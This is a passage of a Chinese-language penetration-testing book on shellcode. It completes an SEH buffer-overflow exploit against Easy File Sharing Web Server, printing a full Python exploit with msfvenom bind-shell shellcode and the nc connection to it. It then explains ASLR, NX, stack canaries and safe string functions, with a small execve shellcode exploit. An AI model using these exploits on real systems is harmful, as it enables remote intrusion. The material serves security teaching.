现在我们需要为短跳转操作设置**nSEH**，`\xeb\x10`，并为`pop`，`pop`和`ret`操作设置**SEH**地址。让我们尝试使用`mona`来找到一个。

首先，在 Immunity Debugger 中设置日志文件位置：

```
!mona config -set workingfolder c:\logs\%p
```

然后，提取 SEH 的详细信息：

```
!mona seh
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00401.gif)

我们需要一个没有任何坏字符的地址，所以从`c:\logs\fsws\seh.txt`中打开日志文件。

选择一个，但记住要避免任何坏字符：

```
0x1001a1bf : pop edi # pop ebx # ret  |  {PAGE_EXECUTE_READ} [ImageLoad.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll)
```

这是我们的 SEH 地址`0x1001a1bf`：

```
SEH = '\xbf\xa1\x01\x10' 
```

现在是时候在端口`4321`上生成和绑定 TCP shellcode 了。

```
$ msfvenom -p windows/shell_bind_tcp LPORT=4321 -b '\x00\x20\x25\x2b\x2f\x5c' -f python

buf = ""
buf += "\xd9\xf6\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x53\xbb\xbb"
buf += "\x75\x92\x5d\x31\x58\x17\x83\xe8\xfc\x03\xe3\x66\x70"
buf += "\xa8\xef\x61\xf6\x53\x0f\x72\x97\xda\xea\x43\x97\xb9"
buf += "\x7f\xf3\x27\xc9\x2d\xf8\xcc\x9f\xc5\x8b\xa1\x37\xea"
buf += "\x3c\x0f\x6e\xc5\xbd\x3c\x52\x44\x3e\x3f\x87\xa6\x7f"
buf += "\xf0\xda\xa7\xb8\xed\x17\xf5\x11\x79\x85\xe9\x16\x37"
buf += "\x16\x82\x65\xd9\x1e\x77\x3d\xd8\x0f\x26\x35\x83\x8f"
buf += "\xc9\x9a\xbf\x99\xd1\xff\xfa\x50\x6a\xcb\x71\x63\xba"
buf += "\x05\x79\xc8\x83\xa9\x88\x10\xc4\x0e\x73\x67\x3c\x6d"
buf += "\x0e\x70\xfb\x0f\xd4\xf5\x1f\xb7\x9f\xae\xfb\x49\x73"
buf += "\x28\x88\x46\x38\x3e\xd6\x4a\xbf\x93\x6d\x76\x34\x12"
buf += "\xa1\xfe\x0e\x31\x65\x5a\xd4\x58\x3c\x06\xbb\x65\x5e"
buf += "\xe9\x64\xc0\x15\x04\x70\x79\x74\x41\xb5\xb0\x86\x91"
buf += "\xd1\xc3\xf5\xa3\x7e\x78\x91\x8f\xf7\xa6\x66\xef\x2d"
buf += "\x1e\xf8\x0e\xce\x5f\xd1\xd4\x9a\x0f\x49\xfc\xa2\xdb"
buf += "\x89\x01\x77\x71\x81\xa4\x28\x64\x6c\x16\x99\x28\xde"
buf += "\xff\xf3\xa6\x01\x1f\xfc\x6c\x2a\x88\x01\x8f\x44\xa8"
buf += "\x8f\x69\x0e\x3a\xc6\x22\xa6\xf8\x3d\xfb\x51\x02\x14"
buf += "\x53\xf5\x4b\x7e\x64\xfa\x4b\x54\xc2\x6c\xc0\xbb\xd6"
buf += "\x8d\xd7\x91\x7e\xda\x40\x6f\xef\xa9\xf1\x70\x3a\x59"
buf += "\x91\xe3\xa1\x99\xdc\x1f\x7e\xce\x89\xee\x77\x9a\x27"
buf += "\x48\x2e\xb8\xb5\x0c\x09\x78\x62\xed\x94\x81\xe7\x49"
buf += "\xb3\x91\x31\x51\xff\xc5\xed\x04\xa9\xb3\x4b\xff\x1b"
buf += "\x6d\x02\xac\xf5\xf9\xd3\x9e\xc5\x7f\xdc\xca\xb3\x9f"
buf += "\x6d\xa3\x85\xa0\x42\x23\x02\xd9\xbe\xd3\xed\x30\x7b"
buf += "\xe3\xa7\x18\x2a\x6c\x6e\xc9\x6e\xf1\x91\x24\xac\x0c"
buf += "\x12\xcc\x4d\xeb\x0a\xa5\x48\xb7\x8c\x56\x21\xa8\x78"
buf += "\x58\x96\xc9\xa8"
```

我们的利用程序的结构应该是这样的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00402.gif)

让我们看看我们最终的利用程序：

```
#!/usr/bin/python
import socket

junk = 'A'*4061
nSEH='\xeb\x10\x90\x90'
SEH = '\xbf\xa1\x01\x10' 
NOPs='\x90'*20

buf = ""
buf += "\xd9\xf6\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x53\xbb\xbb"
buf += "\x75\x92\x5d\x31\x58\x17\x83\xe8\xfc\x03\xe3\x66\x70"
buf += "\xa8\xef\x61\xf6\x53\x0f\x72\x97\xda\xea\x43\x97\xb9"
buf += "\x7f\xf3\x27\xc9\x2d\xf8\xcc\x9f\xc5\x8b\xa1\x37\xea"
buf += "\x3c\x0f\x6e\xc5\xbd\x3c\x52\x44\x3e\x3f\x87\xa6\x7f"
buf += "\xf0\xda\xa7\xb8\xed\x17\xf5\x11\x79\x85\xe9\x16\x37"
buf += "\x16\x82\x65\xd9\x1e\x77\x3d\xd8\x0f\x26\x35\x83\x8f"
buf += "\xc9\x9a\xbf\x99\xd1\xff\xfa\x50\x6a\xcb\x71\x63\xba"
buf += "\x05\x79\xc8\x83\xa9\x88\x10\xc4\x0e\x73\x67\x3c\x6d"
buf += "\x0e\x70\xfb\x0f\xd4\xf5\x1f\xb7\x9f\xae\xfb\x49\x73"
buf += "\x28\x88\x46\x38\x3e\xd6\x4a\xbf\x93\x6d\x76\x34\x12"
buf += "\xa1\xfe\x0e\x31\x65\x5a\xd4\x58\x3c\x06\xbb\x65\x5e"
buf += "\xe9\x64\xc0\x15\x04\x70\x79\x74\x41\xb5\xb0\x86\x91"
buf += "\xd1\xc3\xf5\xa3\x7e\x78\x91\x8f\xf7\xa6\x66\xef\x2d"
buf += "\x1e\xf8\x0e\xce\x5f\xd1\xd4\x9a\x0f\x49\xfc\xa2\xdb"
buf += "\x89\x01\x77\x71\x81\xa4\x28\x64\x6c\x16\x99\x28\xde"
buf += "\xff\xf3\xa6\x01\x1f\xfc\x6c\x2a\x88\x01\x8f\x44\xa8"
buf += "\x8f\x69\x0e\x3a\xc6\x22\xa6\xf8\x3d\xfb\x51\x02\x14"
buf += "\x53\xf5\x4b\x7e\x64\xfa\x4b\x54\xc2\x6c\xc0\xbb\xd6"
buf += "\x8d\xd7\x91\x7e\xda\x40\x6f\xef\xa9\xf1\x70\x3a\x59"
buf += "\x91\xe3\xa1\x99\xdc\x1f\x7e\xce\x89\xee\x77\x9a\x27"
buf += "\x48\x2e\xb8\xb5\x0c\x09\x78\x62\xed\x94\x81\xe7\x49"
buf += "\xb3\x91\x31\x51\xff\xc5\xed\x04\xa9\xb3\x4b\xff\x1b"
buf += "\x6d\x02\xac\xf5\xf9\xd3\x9e\xc5\x7f\xdc\xca\xb3\x9f"
buf += "\x6d\xa3\x85\xa0\x42\x23\x02\xd9\xbe\xd3\xed\x30\x7b"
buf += "\xe3\xa7\x18\x2a\x6c\x6e\xc9\x6e\xf1\x91\x24\xac\x0c"
buf += "\x12\xcc\x4d\xeb\x0a\xa5\x48\xb7\x8c\x56\x21\xa8\x78"
buf += "\x58\x96\xc9\xa8"

injection = junk + nSEH + SEH + NOPs + buf

s = socket.socket()
s.connect(('192.168.129.128',80))
s.send("GET " + injection + " HTTP/1.0\r\n\r\n") 
s.close()
```

关闭应用程序并重新启动。然后，运行利用程序并在端口`4321`上运行`nc`：

```
$ nc 192.168.129.128 4321
```

上述命令的输出如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00403.gif)

运行正常！

# 总结

在本章中，我们对一些新的东西进行了真实的场景，即基于 SEH 的缓冲区溢出，并看了如何控制 SEH 并利用它。

到目前为止，我们在本书中所做的只是触及了这种类型的攻击的表面，您应该多加练习，因为这还不是结束。

在下一章中，我们将讨论系统中的安全机制以及如何使您的代码更安全。


# 第十二章：检测和预防

最后，到了本书的最后一章。在这里，我们将讨论防止缓冲区溢出攻击的安全机制。让我们将这些机制分为三部分：

+   系统方法

+   编译器方法

+   开发者方法

# 系统方法

在这部分，我们将讨论一些系统内核内置的机制，以防止缓冲区溢出攻击中的 ASLR 等技术。

**地址空间布局随机化**（**ASLR**）是一种针对溢出攻击的缓解技术，它随机化内存段，从而防止硬编码的利用。例如，如果我想使用返回到库的技术，我必须获取将在攻击中使用的函数的地址。然而，由于内存段的地址是随机化的，唯一的方法就是猜测那个位置，是的，我们使用这种技术来规避 NX 保护，但不能规避 ASLR。

对于安全极客们，不用担心；有许多方法可以规避 ASLR。让我们看看 ASLR 是如何真正工作的。打开你的 Linux 受害机器，并确保 ASLR 已禁用：

```
$ cat /proc/sys/kernel/randomize_va_space
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00404.jpeg)

由于`randomize_va_space`的值为`0`，ASLR 已禁用。如果已启用，请将其设置为`0`：

```
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

现在，让我们看看任何应用程序的寻址布局，例如`cat`：

```
$ cat
```

然后，打开另一个终端。现在，我们需要使用以下命令获取该进程的 PID：

```
 $ ps aux | grep cat
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00405.jpeg)

`cat`的 PID 是`5029`。让我们获取此进程的内存布局：

```
$ cat /proc/5029/maps
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00406.jpeg)

现在，停止`cat`进程使用*Ctrl* + *C*，然后再次启动它：

```
$ cat
```

然后，从另一个终端窗口运行以下命令：

```
$ ps aux | grep cat
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00407.jpeg)

现在，`cat`的 PID 是`5164`。让我们获取此 PID 的内存布局：

```
$ cat /proc/5164/maps
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00408.jpeg)

看看两个 PID 的内存布局；它们完全相同。所有东西都是静态分配在内存中的，比如库、堆栈和堆。

现在，让我们启用 ASLR 来看看区别：

```
$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

确保 ASLR 已启用：

```
$ cat /proc/sys/kernel/randomize_va_space
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00409.jpeg)

然后，让我们启动任何进程，例如`cat`：

```
$ cat
```

然后，从另一个终端窗口运行以下命令：

```
$ ps aux | grep cat
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00410.jpeg)

`cat`的 PID 是`5271`。现在，阅读它的内存布局：

```
$ cat /proc/5271/maps
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00411.jpeg)

现在，让我们停止`cat`，然后再次运行它：

```
$ cat
```

然后，让我们捕获`cat`的 PID：

```
$ ps aux | grep cat
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00412.jpeg)

现在，阅读它的内存布局：

```
$ cat /proc/5341/maps
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00413.jpeg)

让我们比较两个地址。它们完全不同。堆栈、堆和库现在都是动态分配的，所有地址将对每次执行都变得唯一。

现在到下一部分，即编译器方法，比如可执行空间保护和 canary。

# 编译器方法

可执行空间保护是一种技术，用于将内存中的某些段标记为不可执行，比如堆栈和堆。因此，即使我们成功注入了 shellcode，也不可能使该 shellcode 运行。

在 Linux 中，可执行空间保护被称为**不可执行**（**NX**），在 Windows 中被称为**数据执行防护**（**DEP**）。

让我们尝试使用我们在第六章中的例子，*缓冲区溢出攻击*：

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int copytobuffer(char* input)
{
    char buffer[256];
    strcpy (buffer,input);
    return 0;
}

void main (int argc, char *argv[])
{
    int local_variable = 1;
    copytobuffer(argv[1]);
    exit(0);
}
```

现在，禁用 NX 编译它：

```
$ gcc -fno-stack-protector -z execstack nx.c -o nx
```

在 GDB 中打开它：

```
$ gdb ./nx
```

然后，让我们运行这个利用：

```
#!/usr/bin/python
from struct import *

buffer = ''
buffer += '\x90'*232
buffer += '\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05'
buffer += pack("<Q", 0x7fffffffe2c0)
f = open("input.txt", "w")
f.write(buffer)
```

执行利用：

```
$ python exploit.py
```

在 GDB 中，运行以下命令：

```
$ run $(cat input.txt)
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00414.jpeg)

现在，让我们尝试启用 NX 的相同利用：

```
$ gcc -fno-stack-protector nx.c -o nx
```

然后，在 GDB 中打开它并运行以下命令：

```
$ run $(cat input.txt)
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00415.jpeg)

那么，为什么代码会卡在这个地址？

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00416.jpeg)

因为它甚至拒绝执行我们从栈中的 No Operation (`nop`)，因为栈现在是不可执行的。

让我们谈谈另一种技术，即栈 canary 或栈保护器。栈 canary 用于检测任何企图破坏栈的行为。

当一个返回值存储在栈中时，在存储返回地址之前会写入一个称为**canary**值的值。因此，任何尝试执行栈溢出攻击的行为都会覆盖**canary**值，这将导致引发一个标志来停止执行，因为有企图破坏栈的行为：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00417.jpeg)

现在，尝试使用我们之前的例子，但让我们启用栈`canary`：

```
$ gcc -z execstack canary.c -o canary
```

然后，在 GDB 中重新运行它并尝试我们的利用：

```
$ run $(cat input.txt)
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00418.jpeg)

让我们看看为什么它失败了：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00419.jpeg)

它试图将原始 canary 值与存储的值进行比较，但失败了，因为我们用我们的攻击覆盖了原始值：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00420.jpeg)

正如你所看到的，栈破坏已被检测到！

# 开发者方法

现在到最后一部分，即开发者方法，任何开发者都应该尽其所能保护他们的代码免受溢出攻击。我会谈论 C/C++，但概念仍然是一样的。

首先，在使用任何字符串处理函数时，你应该使用安全函数。下表显示了不安全的函数以及应该使用的替代函数：

| **不安全函数** | **安全函数** |
| --- | --- |
| `strcpy` | `strlcpy` |
| `strncpy` | `strlcpy` |
| `strcat` | `strlcat` |
| `strncat` | `strlcat` |
| `vsprintf` | `vsnprintf` 或 `vasprintf` |
| `sprintf` | `snprintf` 或 `asprintf` |

此外，你应该始终使用`sizeof`函数来计算代码中缓冲区的大小。尝试通过将其与安全函数混合使用来精确计算缓冲区大小；然后，你的代码现在更安全了。

# 总结

在本书的最后一章中，我们讨论了操作系统中的一些保护技术，还有一些 C 编译器中的技术，比如 GCC。然后，我们继续讨论如何使你的代码更安全。

这还不是结束。有更多的方法来规避每种保护技术。通过本书，你已经获得了坚实的基础，可以继续你的学习之旅。继续前进，我保证你会掌握这个领域！
